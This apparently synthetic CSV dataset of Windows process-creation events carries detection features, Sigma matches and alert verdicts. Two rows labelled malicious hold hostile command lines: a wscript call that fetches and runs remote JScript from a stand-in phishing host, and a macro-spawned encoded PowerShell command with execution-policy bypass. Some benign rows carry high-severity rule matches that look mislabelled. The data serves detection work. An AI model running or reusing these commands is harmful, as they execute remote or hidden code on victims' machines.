UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label,parent_process_name,child_process_name,is_known_lolbin,is_scripting_engine,command_line_length,command_line_entropy,has_suspicious_flag,contains_url,contains_ip_address,has_base64_pattern,argument_count,suspicious_argument_ratio,has_encoded_command,has_download_indicator,process_ancestry_depth,parent_is_office_app,parent_is_browser,parent_is_script_engine,chain_hash,hour_of_day,is_off_hours,is_weekend,minute_of_hour,parent_child_pair_rarity,command_length_zscore,entropy_zscore,is_system_user,user_encoded,integrity_encoded,sigma_match,sigma_rule_name,sigma_level,sigma_mitre_tags,ml_anomaly_score,chain_risk_score,chain_description,chain_matched_pattern,final_verdict,priority,confidence,explanation
2024-07-03T10:06:39.758Z,{D11F31C2-F4C2-41F7-936E-5DF9124CACF8},39458,C:\Windows\System32\cmd.exe,cmd.exe /c net use Z: \\fileserver\share,C:\Windows\explorer.exe,C:\Windows\explorer.exe,16681,CORP\sysadmin,High,0,,,benign,0,4,1,1,40,4.0251,0,0,0,0,6,0.0,0,0,1,0,0,0,2764436884,10,0,0,6,0.9208,0.13231049082901014,0.28788591636119604,0,10,2,False,None,none,,37.41252859236951,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,12.5,
2024-07-04T00:05:25.517Z,{88A435E5-CACD-46BD-9C68-99BC82CF9DA9},30965,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,64352,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign,3,31,0,0,37,4.3782,0,0,0,0,1,0.0,0,0,1,0,0,0,3001280475,0,1,0,5,1.699,0.012028226439000818,0.8166060036752878,1,7,3,False,None,none,,39.3521460166457,10,services.exe → wmiprvse.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,CLEAR,NONE,13.1,
2024-07-05T15:26:10.188Z,{64E75AA2-4DA6-402C-9FE6-B34DA0EA5797},56981,C:\Program Files\Mozilla Firefox\firefox.exe,firefox.exe -contentproc -childID 7,C:\Program Files\Mozilla Firefox\firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe""",2513,CORP\netadmin,Low,0,,,benign,11,10,0,0,35,4.0931,0,0,0,0,4,0.0,0,0,2,0,1,0,2019625803,15,0,0,26,1.727,-0.0681599498210054,0.3897068337708762,0,8,0,False,None,none,,39.651226778079106,0,firefox.exe → firefox.exe: No known suspicious pattern,False,CLEAR,NONE,13.2,
2024-07-04T04:02:39.634Z,{235D9569-81B0-41E0-A081-728576B3F763},41434,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s wuauserv,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,17107,NT AUTHORITY\SYSTEM,System,0,,,benign,2,33,0,0,57,4.4954,0,0,0,0,6,0.0,0,0,1,0,0,0,65539420,4,1,0,2,1.6726,0.813909989039063,0.9920973495637382,1,2,3,False,None,none,,35.76493380410047,10,svchost.exe → svchost.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,CLEAR,NONE,11.9,
2024-07-04T09:46:57.572Z,{73D0D149-AE8B-40FD-A03C-6FECEB4F6F04},60323,C:\Windows\System32\cmd.exe,cmd.exe /c tasklist,C:\Windows\explorer.exe,C:\Windows\explorer.exe,65105,CORP\analyst02,Medium,0,,,benign,0,4,1,1,19,3.7216,0,0,0,0,3,0.0,0,0,1,0,0,0,2764436884,9,0,0,46,0.9208,-0.7096653599010552,-0.16656479590112944,0,11,1,False,None,none,,31.578269652335422,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,10.5,
2024-07-05T09:14:24.394Z,{BCC0A5FB-2C35-4EC8-B9AD-7FE72E43BD41},9664,C:\Program Files\Microsoft OneDrive\OneDrive.exe,OneDrive.exe /sync,C:\Program Files\Microsoft Office\root\Office16\POWERPNT.EXE,"""C:\Program Files\Microsoft Office\root\Office16\POWERPNT.EXE""",8115,CORP\netadmin,Medium,0,,,benign,7,14,0,0,18,3.6144,0,0,0,0,2,0.0,0,0,2,1,0,0,3106230957,9,0,0,14,2.058,-0.7497594480310582,-0.3270824774646265,0,8,1,False,None,none,,38.58458587391454,0,powerpnt.exe → onedrive.exe: No known suspicious pattern,False,CLEAR,NONE,12.9,
2024-07-02T11:49:55.408Z,{61F54E59-EB5C-4DBD-A955-AF5F863D6C6E},6845,C:\Windows\System32\certutil.exe,certutil.exe -verifystore My server2,C:\Windows\System32\cmd.exe,cmd.exe,2344,CORP\sysadmin,High,0,,,gray_area,1,8,1,0,36,3.8152,0,0,0,0,4,0.0,0,0,2,0,0,1,1473216238,11,0,0,49,3.9031,-0.02806586169100229,-0.02641129781956895,0,10,2,False,None,none,,63.96521533516457,50,cmd.exe → certutil.exe: Command shell invoking certutil,True,CLEAR,NONE,21.3,
2024-07-04T10:56:18.740Z,{D6F2D15C-2549-4957-8469-28EBA7BEB6D0},47621,C:\Windows\System32\msiexec.exe,msiexec.exe /i http://repo.corp.local/package46.msi /quiet /norestart,C:\Windows\System32\cmd.exe,cmd.exe,26583,CORP\itops,High,0,,,gray_area,1,12,0,0,69,4.2843,0,1,0,0,5,0.0,0,0,2,0,0,1,67440360,10,0,0,56,3.9031,1.2950390465991002,0.6760032956639791,0,5,2,False,None,none,,70.67343782049453,15,cmd.exe → msiexec.exe: No known suspicious pattern [Modifiers: +15 URL in command],False,ALERT,MEDIUM,50.4,"ANOMALY SCORE: 71/100 | Unusual factors: URL found in command line: 1.00 (baseline: 0.01±0.11, z=9.4); unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-03T08:58:33.841Z,{34BCD111-6D54-48E3-AC97-6E2DAE927B13},51495,C:\Windows\System32\mmc.exe,mmc.exe diskmgmt.msc,C:\Windows\explorer.exe,C:\Windows\explorer.exe,25573,CORP\itops,High,0,,,benign,0,30,0,0,20,3.3414,0,0,0,0,2,0.0,0,0,1,0,0,0,2647570127,8,0,0,58,1.6021,-0.669571271771052,-0.7358635135358444,0,5,2,False,None,none,,7.873046660634677,0,explorer.exe → mmc.exe: No known suspicious pattern,False,CLEAR,NONE,2.6,
2024-07-03T14:06:00.100Z,{F3A8EF8A-DBC7-49F8-9EF9-8E1F28F6FDDE},17956,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Set-ExecutionPolicy RemoteSigned -Scope CurrentUser""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,15549,CORP\admin,High,0,,,benign,1,3,1,1,88,4.5334,1,0,0,0,7,0.1429,0,0,2,0,0,1,4082297620,14,0,0,6,1.3846,2.0568267210691595,1.0489972739985602,0,3,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,49.48537270448572,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.9,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 49 | Chain Risk: 5
2024-07-03T11:17:30.981Z,{78118FEA-8E7A-4297-90FA-A7B751E3CF48},41179,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --type=renderer --field-trial-handle=12345,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",23485,CORP\dbadmin,Low,0,,,benign,5,13,0,0,53,4.2344,0,0,0,0,3,0.0,0,0,2,0,1,0,3035334175,11,0,0,17,1.727,0.6535336365190505,0.6012847106824633,0,4,0,False,None,none,,39.46172576704669,0,chrome.exe → chrome.exe: No known suspicious pattern,False,CLEAR,NONE,13.2,
2024-07-02T10:39:54.654Z,{330180D7-7B3B-4A10-AB4E-8796172582C3},59788,C:\Windows\System32\cmd.exe,cmd.exe /c xcopy C:\Data D:\Backup /s /e,C:\Windows\explorer.exe,C:\Windows\explorer.exe,27574,CORP\admin,High,0,,,benign,0,4,1,1,40,4.1276,0,0,0,0,7,0.0,0,0,1,0,0,0,2764436884,10,0,0,39,0.9208,0.13231049082901014,0.4413659756919649,0,3,2,False,None,none,,40.469995884396255,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,13.5,
2024-07-04T12:29:54.309Z,{B38E253A-AD0F-4C8B-B379-890E855BF113},14055,C:\Windows\System32\notepad.exe,notepad.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",26211,CORP\netadmin,Medium,0,,,benign,0,47,0,0,11,3.0272,0,0,0,0,1,0.0,0,0,1,0,0,0,3438198496,12,0,0,29,2.1249,-1.03041806494108,-1.2063360466258695,0,8,1,False,None,none,,11.099719103762103,0,explorer.exe → notepad.exe: No known suspicious pattern,False,CLEAR,NONE,3.7,
2024-07-03T09:55:10.724Z,{B1FF7794-106A-4B19-92C0-03BC8A00969C},2625,C:\Windows\System32\schtasks.exe,"schtasks.exe /run /tn ""\Microsoft\Windows\Defrag\ScheduledDefrag""",C:\Windows\System32\cmd.exe,cmd.exe,38486,CORP\itops,High,0,,,gray_area,1,15,0,0,65,4.5584,0,0,0,0,4,0.0,0,0,2,0,0,1,200102300,9,0,0,55,3.9031,1.1346626940790878,1.086431434810942,0,5,2,False,None,none,,63.26220329659907,0,cmd.exe → schtasks.exe: No known suspicious pattern,False,CLEAR,NONE,21.1,
2024-07-05T13:13:41.511Z,{49C33AEC-E5A0-4DAC-8F17-5D1226256590},26928,C:\Windows\System32\calc.exe,calc.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",58978,CORP\pchen,Medium,0,,,benign,0,35,0,0,8,2.5,0,0,0,0,1,0.0,0,0,1,0,0,0,2236906458,13,0,0,13,1.699,-1.1507003293310893,-1.9957476298373948,0,1,1,False,None,none,,18.310034435638737,0,explorer.exe → calc.exe: No known suspicious pattern,False,CLEAR,NONE,6.1,
2024-07-05T21:20:40.735Z,{851ADC97-200E-48C4-883C-5885698ABC34},59159,C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,Acrobat.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",50768,CORP\analyst01,Medium,0,,,benign,0,27,0,0,11,3.2776,0,0,0,0,1,0.0,0,0,1,0,0,0,3378330899,21,0,0,20,1.6478,-1.03041806494108,-0.831395491929045,0,13,1,False,None,none,,18.493605027790135,0,explorer.exe → acrobat.exe: No known suspicious pattern,False,CLEAR,NONE,6.2,
2024-07-05T03:21:19.330Z,{711C6849-5E5C-4A3A-A243-59C2CBCF4EF0},9942,C:\Windows\System32\UsoClient.exe,UsoClient.exe StartInteractiveScan,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,64954,NT AUTHORITY\SYSTEM,System,0,,,benign,2,9,0,0,34,3.8895,0,0,0,0,2,0.0,0,0,1,0,0,0,392754572,3,1,0,21,1.7891,-0.1082540379510085,0.08484302811483231,1,2,3,False,None,none,,27.221092274357176,10,svchost.exe → usoclient.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,CLEAR,NONE,9.1,
2024-07-01T09:10:57.156Z,{F4EF5E3C-54DB-4550-862D-35C01ABDEE7B},49416,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -Command ""Import-Module ActiveDirectory; Get-ADComputer -Filter {OperatingSystem -like '*Server*'} -Properties OperatingSystem, LastLogonDate | Select Name, OperatingSystem, LastLogonDate | Export-Csv C:\Reports\servers.csv""",C:\Windows\System32\cmd.exe,cmd.exe,47045,CORP\sysadmin,High,0,,,gray_area,1,3,1,1,239,4.8519,0,0,0,0,20,0.0,0,0,2,0,0,1,4082297620,9,0,0,10,1.3846,8.11103402869963,1.525908482748314,0,10,2,False,None,none,,94.5437828199243,0,cmd.exe → powershell.exe: No known suspicious pattern,False,ALERT,MEDIUM,66.4,"ANOMALY SCORE: 95/100 | Unusual factors: unusually long command line: 239.00 (baseline: 36.70±24.93, z=8.1); command length significantly above baseline: 8.11 (baseline: -0.00±1.00, z=8.1); unusual number of arguments: 20.00 (baseline: 3.17±2.29, z=7.3); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-03T10:07:19.502Z,{E4EE0A68-E84C-4346-A8EF-DEC88CB208ED},53500,C:\Windows\System32\certutil.exe,certutil.exe -verifystore My server3,C:\Windows\System32\cmd.exe,cmd.exe,29335,CORP\sysadmin,High,0,,,gray_area,1,8,1,0,36,3.8152,0,0,0,0,4,0.0,0,0,2,0,0,1,1473216238,10,0,0,7,3.9031,-0.02806586169100229,-0.02641129781956895,0,10,2,False,None,none,,63.97180205426458,50,cmd.exe → certutil.exe: Command shell invoking certutil,True,CLEAR,NONE,21.3,
2024-07-01T09:40:54.730Z,{68FF4EB2-3428-4425-BC52-E9000DB05ECE},29297,C:\Windows\System32\msiexec.exe,msiexec.exe /i http://deploy.corp.local/package4.msi /quiet /norestart,C:\Windows\System32\cmd.exe,cmd.exe,65191,CORP\sysadmin,High,0,,,gray_area,1,12,0,0,70,4.3381,0,1,0,0,5,0.0,0,0,2,0,0,1,67440360,9,0,0,40,3.9031,1.3351331347291033,0.7565616097322263,0,10,2,False,None,none,,70.83782148503911,15,cmd.exe → msiexec.exe: No known suspicious pattern [Modifiers: +15 URL in command],False,ALERT,MEDIUM,50.6,"ANOMALY SCORE: 71/100 | Unusual factors: URL found in command line: 1.00 (baseline: 0.01±0.11, z=9.4); unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-01T14:34:01.005Z,{72F8F61F-D30E-437C-8FFE-D7E87BEBF67D},26882,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Scripts\Backup-SharePointSites.ps1 -SiteUrl https://corp.sharepoint.com -OutputPath D:\Backups,C:\Windows\System32\cmd.exe,cmd.exe,8646,CORP\itops,High,0,,,gray_area,1,3,1,1,153,4.7508,1,1,0,0,10,0.1,0,0,2,0,0,1,4082297620,14,0,0,34,1.3846,4.662942449519361,1.374524736423039,0,5,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,97.77085010895149,20,"cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +15 URL in command, +5 suspicious flags]",False,ALERT,CRITICAL,99.8,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 98 | Chain Risk: 20
2024-07-03T17:32:35.584Z,{9FBDAA7F-3687-45C0-B187-0CF3A16D89D4},61681,C:\Windows\System32\fontdrvhost.exe,fontdrvhost.exe,C:\Windows\System32\smss.exe,smss.exe,38461,NT AUTHORITY\SYSTEM,System,0,,,benign,8,45,0,0,15,3.5069,0,0,0,0,1,0.0,0,0,1,0,0,0,4139425083,17,0,0,32,2.2041,-0.8700417124210675,-0.4880493689578717,1,2,3,False,None,none,,25.15324165605867,0,smss.exe → fontdrvhost.exe: No known suspicious pattern,False,CLEAR,NONE,8.4,
2024-07-05T10:22:18.480Z,{355AFE12-B4F9-464C-AFBB-C0910274FDFB},36068,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --type=renderer --field-trial-handle=12345,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",1545,CORP\jsmith,Low,0,,,benign,5,13,0,0,53,4.2344,0,0,0,0,3,0.0,0,0,2,0,1,0,3035334175,10,0,0,22,1.727,0.6535336365190505,0.6012847106824633,0,9,0,False,None,none,,39.87625625027667,0,chrome.exe → chrome.exe: No known suspicious pattern,False,CLEAR,NONE,13.3,
2024-07-05T12:49:41.348Z,{1ED2F857-6C25-4A8A-838A-6B096EE82894},8310,C:\Program Files\Zoom\bin\Zoom.exe,Zoom.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",20234,CORP\agarwal,Medium,0,,,benign,0,55,0,0,8,2.5,0,0,0,0,1,0.0,0,0,1,0,0,0,2436068358,12,0,0,49,1.9031,-1.1507003293310893,-1.9957476298373948,0,12,1,False,None,none,,16.648062208358642,0,explorer.exe → zoom.exe: No known suspicious pattern,False,CLEAR,NONE,5.5,
2024-07-05T11:14:42.603Z,{4235F7B2-8793-4A82-9DC5-957CBB200A2A},54376,C:\Windows\SoftwareDistribution\Download\Install\update.exe,update.exe /quiet /norestart,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,12491,NT AUTHORITY\SYSTEM,System,0,,,benign,2,36,0,0,28,3.7499,0,0,0,0,3,0.0,0,0,1,0,0,0,2407871594,11,0,0,14,1.8239,-0.3488185667310272,-0.12418932586151261,1,2,3,False,None,none,,9.019336687429071,0,svchost.exe → update.exe: No known suspicious pattern,False,CLEAR,NONE,3.0,
2024-07-02T12:49:06.915Z,{15256D95-2079-44EC-9AD9-0D9790C6129E},38611,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Set-ExecutionPolicy RemoteSigned -Scope CurrentUser""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,45179,CORP\sysadmin,High,0,,,benign,1,3,1,1,88,4.5334,1,0,0,0,7,0.1429,0,0,2,0,0,1,4082297620,12,0,0,49,1.3846,2.0568267210691595,1.0489972739985602,0,10,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,49.4310702027376,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.9,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 49 | Chain Risk: 5
2024-07-03T09:13:10.406Z,{38E78BA2-8F98-49BB-83D1-2369B25EF489},7750,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --type=renderer --field-trial-handle=12345,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",7262,CORP\klee,Low,0,,,benign,5,13,0,0,53,4.2344,0,0,0,0,3,0.0,0,0,2,0,1,0,3035334175,9,0,0,13,1.727,0.6535336365190505,0.6012847106824633,0,6,0,False,None,none,,40.37965323493067,0,chrome.exe → chrome.exe: No known suspicious pattern,False,CLEAR,NONE,13.5,
2024-07-05T03:18:05.781Z,{0D3FD874-8A08-4D4D-819F-5E910C2F2B06},11506,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k LocalService -p,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,18877,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign,3,33,0,0,50,4.6713,0,0,0,0,4,0.0,0,0,1,0,0,0,2168783887,3,1,0,18,1.3349,0.5332513721290413,1.2554841050396617,1,15,3,False,None,none,,40.06597915987932,10,services.exe → svchost.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,CLEAR,NONE,13.4,
2024-07-04T20:31:41.324Z,{85E78E68-0633-4BC3-8C2A-6D50E927C9FC},12416,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,47345,NT AUTHORITY\SYSTEM,System,0,,,benign,2,49,0,0,41,4.269,0,0,0,0,1,0.0,0,0,1,0,0,0,1713248854,20,0,0,31,1.8617,0.17240457895901326,0.653093589246801,1,2,3,False,None,none,,21.352428347473463,0,svchost.exe → trustedinstaller.exe: No known suspicious pattern,False,CLEAR,NONE,7.1,
2024-07-03T22:04:22.430Z,{88C0E78F-7C79-46E7-9A65-3E30AF8DBA60},40460,C:\Windows\System32\wscript.exe,wscript.exe //e:jscript http://phish-host6775.cc/script898.js,C:\Windows\System32\cmd.exe,cmd.exe /c,48790,CORP\jsmith,Medium,1,T1059.005,WScript Remote Script,malicious,1,21,1,1,61,4.1912,1,1,0,0,3,0.3333,0,0,2,0,0,1,4144717783,22,0,0,4,3.9031,0.9742863415590755,0.5365984807986665,0,9,1,True,WScript or CScript Remote Script Execution,high,attack.t1059.005,91.53760449890844,75,"cmd.exe → wscript.exe: Command shell invoking WScript [Modifiers: +15 URL in command, +5 suspicious flags]",True,ALERT,CRITICAL,99.2,Sigma rule matched: WScript or CScript Remote Script Execution | ML Score: 92 | Chain Risk: 75
2024-07-04T20:14:08.521Z,{EBA6302E-E52D-4171-90AA-A7B8D8A35641},33343,C:\Program Files\Microsoft\Teams\current\Teams.exe,Teams.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",6957,CORP\analyst02,Medium,0,,,benign,0,41,0,0,9,2.6416,0,0,0,0,1,0.0,0,0,1,0,0,0,2183728879,20,0,0,14,2.058,-1.1106062412010862,-1.7837205429960596,0,11,1,False,None,none,,24.0481091739766,0,explorer.exe → teams.exe: No known suspicious pattern,False,CLEAR,NONE,8.0,
2024-07-01T12:36:38.109Z,{4C11B668-CD24-4571-A166-284FBC56BBBF},61847,C:\Windows\System32\cmd.exe,cmd.exe /c tasklist,C:\Windows\explorer.exe,C:\Windows\explorer.exe,65421,CORP\jsmith,Medium,0,,,benign,0,4,1,1,19,3.7216,0,0,0,0,3,0.0,0,0,1,0,0,0,2764436884,12,0,0,36,0.9208,-0.7096653599010552,-0.16656479590112944,0,9,1,False,None,none,,28.97441865485096,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,9.7,
2024-07-05T15:09:20.883Z,{29454E2D-713C-421A-9891-7FDC6035B03A},47902,C:\Users\admin\Downloads\setup.exe,setup.exe /S /v/qn,C:\Windows\explorer.exe,C:\Windows\explorer.exe,12819,CORP\admin,High,0,,,benign,0,23,0,0,18,3.5305,0,0,0,0,3,0.0,0,0,1,0,0,0,2635501913,15,0,0,9,1.6726,-0.7497594480310582,-0.4527115211509824,0,3,2,False,None,none,,3.9772106383868544,0,explorer.exe → setup.exe: No known suspicious pattern,False,CLEAR,NONE,1.3,
2024-07-04T17:30:49.249Z,{866A7E09-047C-427C-A4A5-93133366663B},50641,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe https://sharepoint.corp.local/sites/team,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",23260,CORP\helpdesk,Medium,0,,,benign,6,13,0,0,51,3.993,0,1,0,0,2,0.0,0,0,2,1,0,0,2101233099,17,0,0,30,1.9488,0.5733454602590443,0.23982045387809633,0,14,1,False,None,none,,59.8411794310492,15,outlook.exe → chrome.exe: No known suspicious pattern [Modifiers: +15 URL in command],False,CLEAR,NONE,19.9,
2024-07-05T14:37:07.356Z,{4F20D979-B2DC-4B33-B959-8CD67DD30339},24067,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Install-Module -Name Az -AllowClobber -Force""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,56411,CORP\itops,High,0,,,benign,1,3,1,1,81,4.4666,1,0,0,0,8,0.125,0,0,2,0,0,1,4082297620,14,0,0,37,1.3846,1.7761681041591375,0.9489731963078728,0,5,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,47.06341681071394,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.7,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 47 | Chain Risk: 5
2024-07-01T16:12:49.643Z,{C751BBD5-F0ED-4584-947A-D9EB64C46C3E},13009,C:\Windows\System32\cmd.exe,cmd.exe /c powershell.exe -ep bypass -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIABDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAHAAYQB5AGwAbwBhAGQALgBwAHMAMQApAA==,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n document38.docm",51114,CORP\pchen,Medium,1,T1204.002,Office Macro Execution,malicious,10,4,1,1,202,4.5512,1,0,0,1,7,0.1429,1,0,2,1,0,0,1182374401,16,0,0,12,3.9031,6.627552767889514,1.0756503964969757,0,1,1,True,Office Application Spawning Command Shell,critical,attack.t1204.002,97.51834794642623,100,"winword.exe → cmd.exe: Office Word spawning command shell (macro indicator) [Modifiers: +20 Office→Script chain, +10 encoded command]",True,ALERT,CRITICAL,99.8,Sigma rule matched: Office Application Spawning Command Shell | ML Score: 98 | Chain Risk: 100
2024-07-01T19:41:19.038Z,{EB0F560C-6689-4206-8ECD-1FFA038C87A4},48893,C:\Windows\System32\dwm.exe,dwm.exe,C:\Windows\System32\smss.exe,smss.exe,53975,NT AUTHORITY\SYSTEM,System,0,,,benign,8,37,0,0,7,2.5216,0,0,0,0,1,0.0,0,0,1,0,0,0,3089833384,19,0,0,41,2.058,-1.1907944174610925,-1.9634045148954966,1,2,3,False,None,none,,41.70146482496092,0,smss.exe → dwm.exe: No known suspicious pattern,False,CLEAR,NONE,13.9,
2024-07-01T09:40:50.856Z,{67D2F496-FF9B-48BD-88B8-FDCC41DE5331},31119,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ADUser -Filter * -Properties LastLogonDate | Select Name, LastLogonDate""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,2067,CORP\mjones,Medium,0,,,benign,0,3,1,1,112,4.5569,1,0,0,0,12,0.0833,0,0,1,0,0,0,945137867,9,0,0,40,1.231,3.0190848361892337,1.084185385162199,0,0,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,55.86339137640002,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.6,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 56 | Chain Risk: 5
2024-07-01T20:34:24.189Z,{26AA1264-4697-47EF-A156-85430D5ABD79},25315,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s wuauserv,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,59031,NT AUTHORITY\SYSTEM,System,0,,,benign,2,33,0,0,57,4.4954,0,0,0,0,6,0.0,0,0,1,0,0,0,65539420,20,0,0,34,1.6726,0.813909989039063,0.9920973495637382,1,2,3,False,None,none,,28.22370324561294,0,svchost.exe → svchost.exe: No known suspicious pattern,False,CLEAR,NONE,9.4,
2024-07-03T13:40:16.770Z,{006F4CF9-C1EA-434F-8431-67858B52D5E7},47383,C:\Windows\System32\certutil.exe,certutil.exe -hashfile C:\Downloads\patch.msi MD5,C:\Windows\System32\cmd.exe,cmd.exe,30669,CORP\itops,High,0,,,gray_area,1,8,1,0,49,4.5681,0,0,0,0,4,0.0,0,1,2,0,0,1,1473216238,13,0,0,40,3.9031,0.49315728399903813,1.1009558892061473,0,5,2,False,None,none,,66.78566391547805,50,cmd.exe → certutil.exe: Command shell invoking certutil,True,CLEAR,NONE,22.3,
